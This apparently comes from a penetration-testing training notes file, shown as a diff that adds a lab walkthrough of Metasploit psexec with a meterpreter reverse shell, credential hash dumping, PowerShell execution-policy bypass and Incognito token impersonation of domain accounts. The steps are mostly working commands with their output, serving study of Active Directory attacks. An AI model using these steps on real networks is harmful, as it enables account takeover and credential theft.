@@ -186,3 +186,124 @@ mimikatz (powershell) # LSADump::LSA /patch
 
 * <mark style="color:yellow;">Upon success, this will dump all of the hashes within the domain</mark>
 * <mark style="color:yellow;">This of course includes the Kerberos Ticket Granting Ticket Account (krbtgt)</mark>
+
+## Incognito Token Impersonation
+
+<mark style="color:yellow;">Remember, delegate tokens exist upon login and boot. If a user logs in, you can impersonate them until the computer reboots. Then, you will have to wait for them to log back in if so!</mark>
+
+* <mark style="color:red;">Metasploit</mark> will be utilized
+
+```
+msfconsole 
+
+use exploit/windows/smb/psexec
+
+set rhosts tun0
+
+set dmbdomain <domain_here>
+
+set smbpass <smb_pass_here>
+
+set smbuser <user_here>
+
+show targets
+
+set target 2
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+run
+
+meterpreter >
+```
+
+* Okay, we have a meterpreter shell, now what?
+* Time to configure PowerShell and Incognito
+
+```
+meterpreter > hashdump
+
+meterpreter > getuid
+
+meterpreter > sysinfo
+
+meterpreter > load
+
+meterpreter > shell
+
+C:\Windows\system32>powershell -ep bypass
+
+PS C:\Windows\system32> ^C #press ctrl+C
+Terminate channel 1? [y/n] y
+
+meterpreter > load incognito
+Loading extension incognito...Success.
+
+meterpreter > help
+```
+
+Now that we are at this point and we have a token we can impersonate, we can do things such as:
+
+* Adding a user to a global group
+* Adding a user to a local group
+* Adding a user with all tokens
+* Impersonating a token
+* Listing tokens
+* Snarfing hashes
+
+### Impersonating Token
+
+* We will be utilizing the <mark style="color:yellow;">impersonate\_token Incognito command</mark>
+
+```
+meterpreter > list_tokens -u
+
+Delegate Tokens Available
+MARVEL\Administrator
+
+meterpreter > impersonate_token marvel\\administrator
+Delegation token available
+Successfully impersonated user MARVEL\Administrator
+
+meterpreter > shell
+
+C:\Windows\system32>whoami
+
+marvel\administrator
+```
+
+### Attempting hashdump but the system is denying access?
+
+<mark style="color:yellow;">rev2self</mark>
+
+```
+C:\Windows\system32> ^C
+Terminate channel 2? [y/n] y
+
+meterpreter > hashdump
+Operation failed: Access is denied.
+
+meterpreter > meterpreter > rev2self
+
+meterpreter > hashdump
+
+===dump will appear here===
+```
+
+### Did a new user just log in?
+
+Say theoretically we are another user but fcastle logs in a few minutes ago. We can capture this behavior by listing the tokens on the machine via <mark style="color:yellow;">list\_tokens.</mark>
+
+Once we have captured this user, we can then use <mark style="color:yellow;">impersonate\_token</mark> to impersonate them!
+
+```
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+MARVEL\Administrator
+MARVEL\fcastle
+
+meterpreter > impersonate_token marvel\\fcastle
+Delegation token available
+Successfully impersonated user MARVEL\fcastle
+```
